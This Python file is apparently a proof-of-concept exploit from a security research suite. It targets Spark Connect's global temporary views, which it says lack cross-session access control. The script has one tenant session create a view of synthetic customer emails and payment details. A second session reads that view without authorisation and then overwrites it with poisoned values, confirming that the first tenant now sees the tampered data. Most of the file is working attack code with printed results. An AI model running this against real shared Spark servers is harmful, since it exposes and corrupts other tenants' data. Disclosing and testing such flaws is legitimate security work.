"""
Attack D: Global Temporary View Poisoning
Global temp views (global_temp schema) are visible across ALL sessions on the same
Spark Connect server. No cross-session ACL enforcement exists.

Two variants:
  D1: Passive read - Tenant B reads Tenant A's global view
  D2: Namespace squatting - Tenant B overwrites Tenant A's view
"""

import time
from pyspark.sql import SparkSession

def make_fresh_session(host, port):
    SparkSession._instantiatedSession = None
    return SparkSession.builder.remote(f"sc://{host}:{port}").create()

def run_attack_d(host="localhost", port=15002, verbose=True):
    results = {"attack": "D", "description": "Global temporary view poisoning"}
    t0 = time.time()

    # --- Tenant A: creates a global temp view with sensitive data ---
    spark_tenant_a = make_fresh_session(host, port)
    spark_tenant_a.sql("""
        CREATE OR REPLACE GLOBAL TEMP VIEW customer_analytics AS
        SELECT 1 AS customer_id, 'alice@corp.com' AS email,
               'credit_card_4111111111111111' AS payment_method,
               8750.00 AS account_balance
        UNION ALL
        SELECT 2, 'bob@corp.com', 'credit_card_5500000000000004', 12300.00
        UNION ALL
        SELECT 3, 'carol@corp.com', 'bank_account_123456789', 3200.00
    """)
    if verbose:
        print("[+] Tenant A created global_temp.customer_analytics")
        print("    (intended for internal BI dashboard only)")

    # --- Tenant B: reads Tenant A's view without any authorization ---
    spark_tenant_b = make_fresh_session(host, port)

    # D1: Passive read
    try:
        rows = spark_tenant_b.sql("SELECT * FROM global_temp.customer_analytics ORDER BY customer_id").collect()
        results["d1_success"] = True
        results["d1_rows"] = [(r.customer_id, r.email, r.payment_method, r.account_balance) for r in rows]
        if verbose:
            print(f"\n[D1] Tenant B passively reads Tenant A's view - {len(rows)} rows exfiltrated:")
            for r in rows:
                print(f"    customer_id={r.customer_id}  email={r.email}")
                print(f"    payment={r.payment_method}  balance={r.account_balance}")
    except Exception as e:
        results["d1_success"] = False
        results["d1_error"] = str(e)
        if verbose:
            print(f"[D1] Read failed: {e}")

    # D2: Namespace squatting - Tenant B overwrites Tenant A's view
    try:
        spark_tenant_b.sql("""
            CREATE OR REPLACE GLOBAL TEMP VIEW customer_analytics AS
            SELECT 1 AS customer_id, 'POISONED' AS email,
                   'REDIRECTED_PAYMENT' AS payment_method,
                   0.0 AS account_balance
        """)
        results["d2_success"] = True
        if verbose:
            print(f"\n[D2] Tenant B overwrote Tenant A's view with poisoned data")

        # Verify Tenant A now sees poisoned data
        poisoned = spark_tenant_a.sql("SELECT * FROM global_temp.customer_analytics").collect()
        results["d2_poisoned_rows"] = [(r.customer_id, r.email, r.payment_method) for r in poisoned]
        if verbose:
            print(f"    Tenant A now reads poisoned view:")
            for r in poisoned:
                print(f"    customer_id={r.customer_id}  email={r.email}  payment={r.payment_method}")
    except Exception as e:
        results["d2_success"] = False
        results["d2_error"] = str(e)
        if verbose:
            print(f"[D2] Squatting failed: {e}")

    spark_tenant_a.stop()
    spark_tenant_b.stop()

    results["success"] = results.get("d1_success", False) or results.get("d2_success", False)
    results["total_ms"] = round((time.time() - t0) * 1000, 1)
    return results

if __name__ == "__main__":
    res = run_attack_d()
    print(f"\n[RESULT] Attack D:")
    print(f"  D1 (passive read):      {'SUCCEEDED' if res.get('d1_success') else 'FAILED'}")
    print(f"  D2 (namespace squat):   {'SUCCEEDED' if res.get('d2_success') else 'FAILED'}")
    print(f"  Total time: {res['total_ms']} ms")
